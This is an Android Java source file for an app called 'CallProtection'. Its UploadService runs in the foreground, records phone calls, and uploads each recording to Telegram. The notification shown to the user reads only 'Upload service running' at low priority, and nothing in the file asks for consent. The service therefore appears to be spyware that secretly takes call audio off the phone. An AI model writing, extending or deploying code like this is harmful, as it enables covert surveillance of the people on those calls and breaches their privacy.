package com.daria.callprotection;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;

public class UploadService extends Service {
    public static final String ACTION_START_RECORD = "ACTION_START_RECORD";
    public static final String ACTION_STOP_RECORD = "ACTION_STOP_RECORD";
    private static final String CHANNEL_ID = "upload_service_channel";

    private CallService recorder;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(54321, buildNotification("Upload service running"));
        recorder = new CallService(getApplicationContext());
        FileLogger.log("UploadService created");
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Upload", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("CallProtection")
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_notification)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || intent.getAction() == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_START_RECORD.equals(action)) {
            FileLogger.log("UploadService: ACTION_START_RECORD");
            new Thread(() -> recorder.startRecording()).start();
        } else if (ACTION_STOP_RECORD.equals(action)) {
            FileLogger.log("UploadService: ACTION_STOP_RECORD");
            new Thread(() -> {
                File audio = recorder.stopRecording();
                if (audio != null && audio.exists()) {
                    TelegramUploader.uploadFile(getApplicationContext(), audio, "Call: " + audio.getName());
                } else {
                    FileLogger.log("UploadService: no audio produced");
                }
            }).start();
        }
        return START_STICKY;
    }

    @Override public void onDestroy() { FileLogger.log("UploadService destroyed"); super.onDestroy(); }
    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
}
